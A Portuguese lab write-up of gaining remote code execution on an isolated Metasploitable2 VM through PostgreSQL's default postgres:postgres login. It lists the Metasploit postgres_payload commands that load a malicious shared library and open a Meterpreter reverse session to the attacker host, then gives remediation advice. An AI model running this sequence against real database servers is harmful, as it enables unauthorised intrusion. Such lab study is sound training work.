# Writeup: PostgreSQL Payload Execution - Metasploitable2

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: Metasploitable2 (VM VirtualBox)
- Rede: Internal Network isolada (192.168.56.0/24)

## 1. Reconhecimento
Identificado na varredura inicial com Nmap: PostgreSQL 8.3.0-8.3.7
rodando na porta 5432/tcp.

## 2. Identificação da vulnerabilidade
Servidor configurado com credencial padrão (postgres:postgres).
Diferente do MySQL, essa versão antiga do PostgreSQL permite
criar funções customizadas usando bibliotecas compartilhadas
(.so), viabilizando execução de código diretamente no sistema
operacional.

## 3. Exploração
Uso do módulo do Metasploit Framework:

    use exploit/linux/postgres/postgres_payload
    set TARGET 0
    set RHOSTS 192.168.56.10
    set LHOST 192.168.56.11
    exploit

O módulo compilou e carregou uma biblioteca maliciosa
(/tmp/IvrOafTr.so) como função customizada do PostgreSQL,
executando o payload Meterpreter.

Resultado: sessão Meterpreter aberta com sucesso.

## 4. Confirmação de acesso
    getuid          -> postgres
    sysinfo         -> Ubuntu 8.04 (Linux 2.6.24-16-server)

## Observação
Assim como no caso do DistCC, o acesso obtido não é root, mas
sim o usuário de sistema "postgres" (processo do banco de
dados). Serviços de banco de dados costumam rodar com usuário
próprio de baixo privilégio como boa prática, mesmo quando
comprometidos.

## Conclusão
Execução de código remoto obtida através de credencial padrão
combinada com a capacidade do PostgreSQL antigo de carregar
bibliotecas compartilhadas. Como correção: nunca usar credencial
padrão em banco de dados, restringir a permissão de criação de
funções customizadas, e manter o PostgreSQL atualizado (versões
recentes têm proteções adicionais contra esse vetor).
